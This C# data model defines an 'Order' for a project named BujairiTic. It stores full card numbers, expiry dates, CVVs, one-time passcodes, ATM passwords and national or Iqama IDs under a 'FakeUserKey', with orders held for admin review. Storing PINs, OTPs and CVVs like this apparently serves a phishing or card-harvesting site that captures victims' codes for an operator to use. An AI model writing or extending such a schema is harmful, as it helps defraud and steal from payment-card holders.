using System.ComponentModel.DataAnnotations;
using static BujairiTic.Models.Enums;

namespace BujairiTic.Models
{
    public class Order
    {
        public int Id { get; set; }

        
        [Required]
        public string FakeUserKey { get; set; } = "";

       
        public string PaymentMethod { get; set; } = "";

       
        public string CardholderName { get; set; } = "";
        public string CardNumber { get; set; } = "";
        public string Expiry { get; set; } = "";
        public string CVV { get; set; } = "";

     
        public string Otp { get; set; } = "";
        public string AtmPassword { get; set; } = "";

       
        public string Mobile { get; set; } = "";
        public string Provider { get; set; } = "";
        public string NationalIdOrIqama { get; set; } = "";

        
        public OrderStatus Status { get; set; } = OrderStatus.PendingAdmin;

      
        public string? TransactionNo { get; set; }

        public DateTime CreatedAt { get; set; } = DateTime.UtcNow;

  
        public List<OrderItem> Items { get; set; } = new();
    }
}
